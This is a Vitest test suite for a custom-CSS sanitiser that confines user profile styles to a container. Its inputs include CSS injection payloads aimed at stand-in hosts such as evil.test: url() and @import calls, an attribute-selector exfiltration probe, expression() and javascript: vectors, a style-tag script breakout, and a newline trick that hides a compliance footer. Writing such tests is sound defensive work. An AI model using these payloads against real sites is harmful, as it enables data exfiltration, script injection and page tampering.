import { describe, expect, it } from 'vitest';
import { CUSTOM_CSS_MAX_LENGTH, sanitizeCustomCss } from './customCss';

const S = '.ab-custom-css';

describe('sanitizeCustomCss', () => {
  it('returns nothing for empty input', () => {
    expect(sanitizeCustomCss(null)).toEqual({ css: '', removed: [] });
    expect(sanitizeCustomCss('   ')).toEqual({ css: '', removed: [] });
  });

  it('scopes every selector to the profile container', () => {
    const { css, removed } = sanitizeCustomCss('h1, .card > p { color: red; font-weight: 700 }');
    expect(css).toBe(`${S} h1, ${S} .card > p { color: red; font-weight: 700; }`);
    expect(removed).toEqual([]);
  });

  it('maps html, body and :root to the container itself', () => {
    expect(sanitizeCustomCss('body { background: #fff }').css).toBe(`${S} { background: #fff; }`);
    expect(sanitizeCustomCss(':root { --brand: #123456 }').css).toBe(`${S} { --brand: #123456; }`);
    expect(sanitizeCustomCss('html body a { color: blue }').css).toBe(`${S} a { color: blue; }`);
    expect(sanitizeCustomCss('body.dark a { color: blue }').css).toBe(
      `${S}.dark a { color: blue; }`
    );
    // Not a prefix match on the word.
    expect(sanitizeCustomCss('bodyguard { color: blue }').css).toBe(
      `${S} bodyguard { color: blue; }`
    );
  });

  it('refuses selectors that would reach a sibling of the container', () => {
    const { css, removed } = sanitizeCustomCss('body ~ footer, + div, a { color: red }');
    expect(css).toBe(`${S} a { color: red; }`);
    expect(removed.length).toBeGreaterThan(0);
    expect(sanitizeCustomCss('& .x { color: red }').css).toBe('');
  });

  it('drops @import, @font-face and other at-rules', () => {
    const { css, removed } = sanitizeCustomCss(
      '@import url("https://evil.test/x.css"); @charset "utf-8"; @font-face { font-family: x; src: url(https://evil.test/f.woff) } @keyframes spin { to { opacity: 0 } } p { color: red }'
    );
    expect(css).toBe(`${S} p { color: red; }`);
    expect(removed).toEqual(
      expect.arrayContaining(['@import', '@charset', '@font-face', '@keyframes'])
    );
  });

  it('keeps @media and @supports, scoping the rules inside', () => {
    const { css } = sanitizeCustomCss('@media (max-width: 600px) { h1 { font-size: 2rem } }');
    expect(css).toBe(`@media (max-width: 600px) { ${S} h1 { font-size: 2rem; } }`);
    expect(sanitizeCustomCss('@supports (display: grid) { .a { display: grid } }').css).toBe(
      `@supports (display: grid) { ${S} .a { display: grid; } }`
    );
  });

  it('drops url() to another origin but keeps a same-origin path', () => {
    const { css, removed } = sanitizeCustomCss(
      'a { background: url(https://tracker.test/p.gif); color: red } b { background-image: url("/hero.jpg") } c { background: url(//evil.test/x) }'
    );
    expect(css).toBe(`${S} a { color: red; }\n${S} b { background-image: url("/hero.jpg"); }`);
    expect(removed).toContain('url() pointing at another site');
  });

  it('refuses a same-origin-looking url() the URL parser would read as another host', () => {
    // The URL parser strips tab/LF/CR anywhere, so "/\t/evil.example" is //evil.example.
    expect(new URL('/\t/evil.example/p.gif', 'https://agentbio.net/jane').host).toBe(
      'evil.example'
    );
    for (const probe of [
      'a { background: url("/\t/evil.example/p.gif") }',
      'a { background: url("/ /evil.example/p.gif") }',
      'a { background: url(/\t/evil.example/p.gif) }',
      'input[value^="a"] { background: url("/\t/evil.example/?v=a") }',
    ]) {
      const { css, removed } = sanitizeCustomCss(probe);
      expect(css, probe).toBe('');
      expect(removed, probe).toContain('url() pointing at another site');
    }
    // A line break inside the quotes ends the string in the browser, so the
    // whole stylesheet is refused before the url() is even looked at (US-536).
    expect(sanitizeCustomCss("a { background: url('/\n/evil.example/p.gif') }").css).toBe('');
    expect(sanitizeCustomCss('a { background: url(/img/hero-1.webp?v=2) }').css).toBe(
      `${S} a { background: url(/img/hero-1.webp?v=2); }`
    );
  });

  it('refuses layout and containment declarations on the container itself', () => {
    const escape = sanitizeCustomCss(
      ':root { --p: fixed; contain: none !important } h1 { position: var(--p); top: 0; left: 0; z-index: 99999 }'
    );
    expect(escape.css).not.toMatch(/contain/);
    expect(escape.css).toContain(`${S} { --p: fixed; }`);

    const overlay = sanitizeCustomCss(
      'body { position: relative; z-index: 9999; margin-bottom: -400px; transform: translateY(300px); background: #fff }'
    );
    expect(overlay.css).toBe(`${S} { background: #fff; }`);
    expect(overlay.removed.some((r) => r.includes('page container'))).toBe(true);

    // body:hover is still the container; body a is not.
    expect(sanitizeCustomCss('body:hover { translate: 0 300px }').css).toBe('');
    expect(sanitizeCustomCss('body a { position: relative; top: 2px }').css).toBe(
      `${S} a { position: relative; top: 2px; }`
    );
  });

  it.each([
    ['expression()', 'a { width: expression(alert(1)) }'],
    ['javascript: URLs', 'a { background: javascript:alert(1) }'],
    ['image-set()', 'a { background: image-set("https://evil.test/a.png" 1x) }'],
    ['image-set()', 'a { background: -webkit-image-set("https://evil.test/a.png" 1x) }'],
    ['src()', 'a { background: src("https://evil.test/a.png") }'],
    ['the behavior property', 'a { behavior: url(x.htc) }'],
    ['the -moz-binding property', 'a { -moz-binding: url(x.xml#x) }'],
    ['attr() as a URL', 'a { background: attr(data-x url) }'],
  ])('drops %s', (label, input) => {
    const { css, removed } = sanitizeCustomCss(input);
    expect(css).toBe('');
    expect(removed).toContain(label);
  });

  it('drops position: fixed and sticky so nothing floats over the page', () => {
    const { css, removed } = sanitizeCustomCss(
      '.x { position: fixed; inset: 0; z-index: 9999 } .y { position: relative }'
    );
    expect(css).toBe(`${S} .x { inset: 0; z-index: 9999; }\n${S} .y { position: relative; }`);
    expect(removed).toContain('position: fixed / sticky');
  });

  it('refuses backslash escapes rather than decoding them', () => {
    const { css, removed } = sanitizeCustomCss('a { background: u\\72l(https://evil.test) }');
    expect(css).toBe('');
    expect(removed[0]).toMatch(/backslash/);
  });

  it('can never close the style element it is rendered into', () => {
    const { css } = sanitizeCustomCss('a { content: "</style><script>alert(1)</script>" }');
    expect(css).not.toContain('<');
  });

  it('rejects the whole stylesheet when braces, quotes or comments are unbalanced', () => {
    for (const input of [
      'a { color: red',
      'a { color: red } }',
      'a { content: "x }',
      '/* a { color: red }',
      'a { width: calc(1px }',
    ]) {
      const { css, removed } = sanitizeCustomCss(input);
      expect(css).toBe('');
      expect(removed[0]).toMatch(/unclosed|everything/);
    }
  });

  it('rejects a string broken by a line break, which the browser ends early (US-536)', () => {
    // A browser ends a CSS string at an unescaped newline (a bad-string token,
    // CSS Syntax 3 §4.3.5), so the `}` after it closes the scoped rule and the
    // next rule is parsed at the top level, unscoped: here it would hide the
    // compliance footer and the AgentBio branding outside the container.
    // Escapes are refused, so a legitimate string can never contain one.
    for (const lineBreak of ['\n', '\r', '\r\n', '\f']) {
      const input = `a { content: "x${lineBreak}} footer, [data-branding] { display: none !important } b { c: "; }`;
      const { css, removed } = sanitizeCustomCss(input);
      expect(css).toBe('');
      expect(removed[0]).toMatch(/unclosed/);
    }
    // The same in a single-quoted string, an attribute selector and a comment-free @media body.
    for (const input of [
      "a { content: 'x\n} footer { display: none } b { c: '; }",
      'a[title="x\n"] { color: red }',
      '@media screen { a { content: "x\n} footer { display: none } b { c: "; } }',
    ]) {
      expect(sanitizeCustomCss(input).css).toBe('');
    }
  });

  it('still accepts line breaks between declarations and inside comments', () => {
    const { css, removed } = sanitizeCustomCss(
      'a {\r\n  color: red;\n  /* a note\n  over two lines */\n  content: "ok";\n}\n'
    );
    expect(css).toBe(`${S} a { color: red; content: "ok"; }`);
    expect(removed).toEqual([]);
  });

  it('ignores braces inside strings and comments', () => {
    const { css } = sanitizeCustomCss('/* } */ a::after { content: "{ }" }');
    expect(css).toBe(`${S} a::after { content: "{ }"; }`);
  });

  it('drops nested rules', () => {
    const { css, removed } = sanitizeCustomCss('.a { color: red; .b { color: blue } }');
    expect(css).toBe('');
    expect(removed).toContain('nested rules');
  });

  it('rejects input over the length limit', () => {
    const { css, removed } = sanitizeCustomCss(
      `a { color: red } ${' '.repeat(CUSTOM_CSS_MAX_LENGTH)}`
    );
    expect(css).toBe('');
    expect(removed[0]).toMatch(/limited to 10,000/);
  });
});
